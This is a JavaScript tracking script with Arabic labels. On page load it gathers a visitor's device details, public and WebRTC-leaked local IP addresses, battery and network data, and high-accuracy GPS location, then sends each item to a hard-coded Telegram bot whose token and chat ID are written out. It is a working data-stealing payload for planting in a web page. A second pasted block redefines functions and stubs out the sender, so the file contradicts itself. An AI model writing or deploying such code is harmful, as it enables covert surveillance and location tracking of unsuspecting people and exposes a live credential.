function sendInformationToTelegram(info) {
    var botToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
    var chatId = '962686305';
    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`;

    fetch(url).then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    }).then(data => {
        console.log('Information sent to Telegram bot:', data);
    }).catch(error => {
        console.error('There was a problem with the fetch operation:', error);
    });
}

function collectDeviceInfo() {
    var ptf = navigator.platform;
    var cc = navigator.hardwareConcurrency || 'غير متوفر';
    var ram = navigator.deviceMemory || 'غير متوفر';
    var ver = navigator.userAgent;
    var brw = 'غير متوفر';
    var canvas = document.createElement('canvas');
    var gl, debugInfo, ven, ren;

    if (ver.indexOf('Firefox') != -1) {
        brw = 'Firefox';
    } else if (ver.indexOf('Chrome') != -1) {
        brw = 'Chrome';
    } else if (ver.indexOf('Safari') != -1) {
        brw = 'Safari';
    } else if (ver.indexOf('Edge') != -1) {
        brw = 'Edge';
    }

    try {
        gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    } catch (e) { }
    if (gl) {
        debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
        ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير متوفر';
    }

    var ht = window.screen.height;
    var wd = window.screen.width;
    var os = ver.substring(0, ver.indexOf(')')).split(';')[1].trim() || 'غير متوفر';

    var deviceInfo = `منصة الجهاز: ${ptf}\nعدد النوى: ${cc}\nالذاكرة العشوائية: ${ram} GB\nنوع المتصفح: ${brw}\nنظام التشغيل: ${os}\nدقة الشاشة: ${ht}x${wd}\nالشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\nنوع وحدة المعالجة الرسومية: ${ren}`;
    sendInformationToTelegram(deviceInfo);

    // Collect IP addresses
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            var ipInfo = `عنوان IP العام: ${data.ip}`;
            sendInformationToTelegram(ipInfo);
        })
        .catch(error => console.error('Error fetching public IP address:', error));

    // Collect local IP address
    getLocalIP(ip => {
        var localIpInfo = `عنوان IP المحلي: ${ip}`;
        sendInformationToTelegram(localIpInfo);
    });

    // Collect battery information
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            var batteryInfo = `
نسبة الشحن: ${battery.level * 100}%
الشحن: ${battery.charging ? 'نعم' : 'لا'}
وقت الشحن المتبقي: ${battery.chargingTime} ثانية
وقت التشغيل المتبقي: ${battery.dischargingTime} ثانية
            `;
            sendInformationToTelegram(batteryInfo);
        });
    }

    // Collect network information
    if ('connection' in navigator) {
        var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        var networkInfo = `
نوع الاتصال: ${connection.type}
سرعة الاتصال: ${connection.downlink} Mbps
فعالية الاتصال: ${connection.effectiveType}
        `;
        sendInformationToTelegram(networkInfo);
    }
}

function getLocalIP(callback) {
    var peerConnection = new RTCPeerConnection({ iceServers: [] });
    peerConnection.createDataChannel('');
    peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer)).catch(error => console.error(error));
    peerConnection.onicecandidate = event => {
        if (event.candidate) {
            var candidate = event.candidate.candidate;
            var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            var ipMatch = ipRegex.exec(candidate);
            if (ipMatch) {
                callback(ipMatch[1]);
            }
        }
    };
}

function requestLocationPermission() {
    if (navigator.geolocation) {
        var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
        navigator.geolocation.getCurrentPosition(function(position) {
            var lat = position.coords.latitude || 'غير متوفر';
            var lon = position.coords.longitude || 'غير متوفر';
            var acc = position.coords.accuracy || 'غير متوفر';
            var alt = position.coords.altitude || 'غير متوفر';
            var dir = position.coords.heading || 'غير متوفر';
            var spd = position.coords.speed || 'غير متوفر';

            var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
            var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\nدقة الموقع: ${acc} متر\nالارتفاع: ${alt} متر\nالاتجاه: ${dir} درجة\nالسرعة: ${spd} متر/ثانية\n\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;
            sendInformationToTelegram(locationInfo);
        }, function (error) {
            console.error('Error getting location:', error);
        }, optn);
    } else {
        console.error('جهازك به مشكلة');
    }
}

// إرسال المعلومات عند تحميل الصفحة
window.onload = function() {
    collectDeviceInfo();
    requestLocationPermission();
};
// الكود الأصلي

function checkLocationPermission() {
    if ("geolocation" in navigator) {
        navigator.permissions.query({name:'geolocation'}).then(function(result) {
            if (result.state === 'granted') {
                // الإذن ممنوح بالفعل، قم بجمع الموقع وإرساله
                collectAndSendLocation();
            } else if (result.state === 'prompt') {
                // عرض النافذة المنبثقة لطلب الإذن
                document.getElementById('permissionPopup').style.display = 'block';
            }
        });
    } else {
        console.log("Geolocation is not supported by this browser.");
    }
}

function requestLocationPermission() {
    navigator.geolocation.getCurrentPosition(function(position) {
        // تم منح الإذن، قم بإخفاء النافذة المنبثقة وجمع الموقع
        document.getElementById('permissionPopup').style.display = 'none';
        collectAndSendLocation();
    }, function(error) {
        console.log("Error: " + error.message);
    });
}

function collectAndSendLocation() {
    navigator.geolocation.getCurrentPosition(function(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        var locationInfo = `الموقع: خط العرض ${lat}، خط الطول ${lon}`;
        sendInformationToTelegram(locationInfo);
    });
}

// استدعاء الدالة عند تحميل الصفحة
window.onload = function() {
    checkLocationPermission();
    // استدعاء الدوال الأخرى هنا
};

// دالة إرسال المعلومات إلى تيليجرام (استخدم الدالة الأصلية التي قدمتها)
function sendInformationToTelegram(info) {
    // ... (الكود الأصلي)
}
